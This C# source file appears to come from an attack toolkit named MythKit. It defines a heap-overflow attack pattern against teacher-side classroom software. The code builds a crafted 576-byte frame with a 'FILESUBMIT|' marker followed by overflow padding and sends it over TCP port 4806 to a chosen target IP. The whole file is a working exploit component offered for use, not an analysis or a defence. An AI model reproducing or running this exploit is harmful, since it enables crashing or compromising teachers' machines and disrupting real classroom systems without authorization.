using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;

namespace MythKit.Pages.ReplayAttack.AttackPatterns.TeacherAttack
{
    /// <summary>
    /// HeapOverflowAttack.xaml 的交互逻辑
    /// </summary>
    public partial class HeapOverflowAttack : UserControl, IAttackPattern
    {
        public HeapOverflowAttack()
        {
            InitializeComponent();
        }
        static readonly byte[] FrameHeader =
        {
            0x00, 0x00, 0x01, 0x00,
            0x57, 0x4F, 0x52, 0x42,   // "WORB"
            0x00, 0x00, 0x00, 0x00
        };
        static byte[] BuildPayloadFrame()
        {
            var f = new byte[576];
            f[0] = 0x00; f[1] = 0x00; f[2] = 0x01; f[3] = 0x00;   // 前缀
            f[4] = 0x49; f[5] = 0x46; f[6] = 0x50; f[7] = 0x55;   // "IFPU"
            f[8] = 0x34; f[9] = 0x02; f[10] = 0x00; f[11] = 0x00; // length = 564
            f[12] = 0x02; f[13] = 0x00; f[14] = 0x00; f[15] = 0x00;
            f[24] = 0x20;                                          // 偏移 0x18
            f[28] = 0xE7; f[29] = 0x19; f[30] = 0xD3; f[31] = 0xAA;
            f[32] = 0x19; f[33] = 0x81; f[34] = 0xDA; f[35] = 0x01;
            f[44] = 0x46; f[45] = 0x00;                           // 'F'
            f[46] = 0x49; f[47] = 0x00;                           // 'I'
            f[48] = 0x4C; f[49] = 0x00;                           // 'L'
            f[50] = 0x45; f[51] = 0x00;                           // 'E'
            f[52] = 0x53; f[53] = 0x00;                           // 'S'
            f[54] = 0x55; f[55] = 0x00;                           // 'U'
            f[56] = 0x42; f[57] = 0x00;                           // 'B'
            f[58] = 0x4D; f[59] = 0x00;                           // 'M'
            f[60] = 0x49; f[61] = 0x00;                           // 'I'
            f[62] = 0x54; f[63] = 0x00;                           // 'T'
            f[64] = 0x7C; f[65] = 0x00;                           // '|'
            for (int i = 66; i <= 97; i += 2) { f[i] = 0x64; f[i + 1] = 0x00; }
            f[98] = 0x7C; f[99] = 0x00;
            // 其余填充，构成溢出长度
            for (int i = 100; i < 576; i++)
            {
                f[i] = (byte)(i % 2 == 0 ? 0x36 : 0x37); // 填充 67676767676767676767
            }
            return f;
        }

        public AttackTarget Target => AttackTarget.Teacher;

        public string AttackName => "堆溢出攻击";

        public string AttackId => "heap_overflow";

        public AttackPacket ConstructPacket(ref string errorMessage, IPAddress targetIP, int cycleId, int groupId)
        {
            byte[] result = FrameHeader.Concat(BuildPayloadFrame()).ToArray();
            return new AttackPacket(new List<byte[]> { result }, 4806, 0, AttackProtocolType.TCP);
        }

        public void Deserialize(Dictionary<string, object> serializedData) { }

        public Dictionary<string, object> Serialize()
        {
            return new Dictionary<string, object>();
        }
    }
}
